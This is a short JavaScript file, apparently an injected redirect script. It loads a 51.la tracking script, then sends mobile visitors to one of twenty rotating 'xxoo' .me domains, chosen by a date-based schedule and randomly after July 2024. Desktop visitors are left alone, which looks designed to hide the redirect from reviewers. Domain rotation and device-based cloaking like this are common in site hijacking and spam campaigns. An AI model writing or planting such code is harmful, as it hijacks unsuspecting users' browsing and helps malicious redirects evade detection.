document.write('<script type="text/javascript" src="https://js.users.51.la/21863543.js"></script>');

const domains = [
  'http://xxoo123.me',
  'http://xxoo124.me',
  'http://xxoo125.me',
  'http://xxoo126.me',
  'http://xxoo127.me',
  'http://xxoo128.me',
  'http://xxoo129.me',
  'http://xxoo130.me',
  'http://xxoo131.me',
  'http://xxoo132.me',
  'http://xxoo133.me',
  'http://xxoo134.me',
  'http://xxoo135.me',
  'http://xxoo136.me',
  'http://xxoo137.me',
  'http://xxoo138.me',
  'http://xxoo139.me',
  'http://xxoo140.me',
  'http://xxoo141.me',
  'http://xxoo142.me'
];

const today = new Date();
const startDate = new Date('2024-06-22');
const endDate = new Date('2024-07-22');
let selectedDomain;

if (today <= endDate) {
    const daysDifference = Math.floor((today - startDate) / (1000 * 60 * 60 * 24));
    const index = daysDifference % domains.length;
    selectedDomain = domains[index];
} else {
    // 日期结束后，随机选择一个域名
    const index = Math.floor(Math.random() * domains.length);
    selectedDomain = domains[index];
}

// 检测是否是移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

if (isMobile) {
    // 是移动设备，执行跳转
    window.location.href = selectedDomain;
} else {
    // 不是移动设备，可以做其他处理，比如提示或者不执行跳转
    console.log("当前设备不是移动设备，不执行跳转。");
}
